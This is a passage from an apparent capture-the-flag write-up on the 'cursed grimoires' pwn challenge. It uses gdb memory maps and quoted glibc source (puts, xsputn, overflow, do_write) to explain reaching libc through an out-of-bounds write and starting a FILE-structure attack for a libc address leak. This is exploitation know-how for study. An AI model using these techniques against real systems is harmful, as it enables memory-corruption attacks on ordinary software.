</span></span><span class="line"><span class="cl">0x000055e0067dd000 0x000055e0067de000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055e0067de000 0x000055e0067df000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap]
</span></span><span class="line"><span class="cl">0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw-
</span></span><span class="line"><span class="cl">0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the chunk was placed not in the heap, but in a new page created by the mmap, and it was placed just before the <code>libc</code> (The offset difference is <code>0x00007f3b78a31000 - 0x00007f3b78939010 = 0xf7ff0</code>). Let&rsquo;s try to run it one more time to confirm it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  x/gx &amp;GRIMOIRE
</span></span><span class="line"><span class="cl">0x555555558030 &lt;GRIMOIRE&gt;:      0x00007ffff7c9c010
</span></span><span class="line"><span class="cl">gef➤  vmmap
</span></span><span class="line"><span class="cl">[ Legend:  Code | Heap | Stack ]
</span></span><span class="line"><span class="cl">Start              End                Offset             Perm Path
</span></span><span class="line"><span class="cl">0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x0000555555559000 0x000055555555a000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched
</span></span><span class="line"><span class="cl">0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap]
</span></span><span class="line"><span class="cl">0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw-
</span></span><span class="line"><span class="cl">0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p>Yup, we can confirm that when we allocated a big chunk, the <code>libc_base_address</code> will be at <code>chunk_address + 0xf7ff0</code>. With this piece of information, now that we can leverage our <code>OOB</code> bug to be able to overwrite any value stored in the <code>libc</code> area by setting the index to <code>0xf7ff0 + libc_target_offset</code>.</p>
<h3 id="getting-a-libc-leak">Getting a libc leak</h3>
<p>Now that we have the power to overwrite any writeable area in the loaded libc, what should we do now? Remember that up until now, we don&rsquo;t have any libc address leak yet. So, it would be a good idea to try finding a way on getting the libc leak.</p>
<p>One of the ways that I could think of is using a FILE Structure Attack. If you don&rsquo;t have any idea or this is your first time hearing about it, I had written some basic knowledge about it in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/" target="_blank" rel="noopener noreffer ">one of my blog&rsquo;s articles</a>. I believe that reading through that article first will give you a strong fundamental to understand the exploit for this challenge.</p>
<p>One of the tricks related to FILE Structure Attack that we could do to leak the libc address is based on this <a href="https://vigneshsrao.github.io/posts/babytcache/" target="_blank" rel="noopener noreffer ">article</a>. The article explained the trick on leaking the libc, but I will try to break it down one by one again based on what I did to understand the article.</p>
<p>Remember that the <code>menu()</code> function will be called on each iteration and it calls <code>puts</code>. So, based on the previous article, if we deep dive into the implementation of <code>puts</code> in the glibc source code, we will get a way to get a libc leak.</p>
<p>Let&rsquo;s start breaking it down one by one starting from the <code>puts</code> method itself.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_puts</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span> <span class="p">(</span><span class="n">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="nf">_IO_vtable_offset</span> <span class="p">(</span><span class="n">stdout</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">       <span class="o">||</span> <span class="nf">_IO_fwide</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_sputn</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">==</span> <span class="n">len</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_putc_unlocked</span> <span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">,</span> <span class="n">stdout</span><span class="p">)</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">MIN</span> <span class="p">(</span><span class="n">INT_MAX</span><span class="p">,</span> <span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">weak_alias</span> <span class="p">(</span><span class="n">_IO_puts</span><span class="p">,</span> <span class="n">puts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_puts</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>puts</code> is an alias to <code>_IO_puts</code>. As you can see, the <code>_IO_puts</code> will call <code>_IO_sputn (stdout, str, len)</code>, which based on this <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L379" target="_blank" rel="noopener noreffer ">LOC</a> in the glibc source code, is an alias to <code>_IO_XSPUTN (__fp, __s, __n)</code>, which means it will jump to the stored pointer for <code>__xsputn</code> key in the <code>stdout</code> FILE.</p>
<p>Inspecting via GDB (or you can deep dive its source code as well), <code>stdout</code> vtable mapped the key <code>__xsputn</code> to the <code>_IO_new_file_xsputn</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  print _IO_2_1_stdout_
</span></span><span class="line"><span class="cl">$4 = {
</span></span><span class="line"><span class="cl">  file = {
</span></span><span class="line"><span class="cl">    _flags = 0xfbad2887,
</span></span><span class="line"><span class="cl">    _IO_read_ptr = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">    _IO_read_end = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">    _IO_read_base = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">    _IO_write_base = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">    _IO_write_ptr = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">    _IO_write_end = 0x7ffff7fae803 &lt;_IO_2_1_stdout_+131&gt; &#34;\n&#34;,
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">    _wide_data = 0x7ffff7fad9a0 &lt;_IO_wide_data_1&gt;,
</span></span><span class="line"><span class="cl">  },
</span></span><span class="line"><span class="cl">  vtable = 0x7ffff7faa600 &lt;__GI__IO_file_jumps&gt;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">gef➤  print __GI__IO_file_jumps
</span></span><span class="line"><span class="cl">$5 = {
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">  __overflow = 0x7ffff7e20e40 &lt;_IO_new_file_overflow&gt;,
</span></span><span class="line"><span class="cl">  __underflow = 0x7ffff7e20b30 &lt;_IO_new_file_underflow&gt;,
</span></span><span class="line"><span class="cl">  __uflow = 0x7ffff7e21de0 &lt;__GI__IO_default_uflow&gt;,
</span></span><span class="line"><span class="cl">  __pbackfail = 0x7ffff7e23300 &lt;__GI__IO_default_pbackfail&gt;,
</span></span><span class="line"><span class="cl">  __xsputn = 0x7ffff7e1f680 &lt;_IO_new_file_xsputn&gt;,
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">  __write = 0x7ffff7e1ef40 &lt;_IO_new_file_write&gt;,
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>So now, let&rsquo;s check the code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">size_t</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_new_file_xsputn</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">to_do</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">must_flush</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">+</span> <span class="n">must_flush</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">size_t</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">do_write</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="cm">/* Next flush the (full) buffer. */</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* If nothing else has to be written we must not signal the
</span></span></span><span class="line"><span class="cl"><span class="cm">	   caller that everything has been written.  */</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="cm">/* Try to maintain alignment: write a whole number of blocks.  */</span>
</span></span><span class="line"><span class="cl">      <span class="n">block_size</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">do_write</span> <span class="o">=</span> <span class="n">to_do</span> <span class="o">-</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">&gt;=</span> <span class="mi">128</span> <span class="o">?</span> <span class="n">to_do</span> <span class="o">%</span> <span class="nl">block_size</span> <span class="p">:</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">do_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="n">count</span> <span class="o">=</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">do_write</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="n">to_do</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">do_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you read the code, it will call <code>_IO_OVERFLOW(f, EOF)</code> before calling <code>new_do_write</code> to write the actual string that we want to print. Based on the <code>vtable</code> above that we see in gdb (the <code>_IO_file_jumps</code>), calling <code>_IO_OVERFLOW</code> equivalents to jump to <code>_IO_new_file_overflow</code>. Let&rsquo;s check the disassembly result of that method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">)</span> <span class="cm">/* SET ERROR */</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* If currently reading or no buffer allocated. */</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>During calling this method, keep in mind first that the passed argument for <code>ch</code> is <code>EOF</code>. And notice this interesting LOC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			 <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we disassemble <code>_IO_do_write</code> method and try to trace the method calls inside of it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">	  <span class="o">||</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">size_t</span>
</span></span><span class="line"><span class="cl"><span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* On a system without a proper O_APPEND implementation,
</span></span></span><span class="line"><span class="cl"><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
</span></span></span><span class="line"><span class="cl"><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
</span></span></span><span class="line"><span class="cl"><span class="cm">       Instead, just indicate that offset (before and after) is
</span></span></span><span class="line"><span class="cl"><span class="cm">       unpredictable. */</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">off64_t</span> <span class="n">new_pos</span>
</span></span><span class="line"><span class="cl">	<span class="o">=</span> <span class="nf">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">count</span> <span class="o">=</span> <span class="nf">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">ssize_t</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_new_file_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">ssize_t</span> <span class="n">n</span><span class="p">)</span>
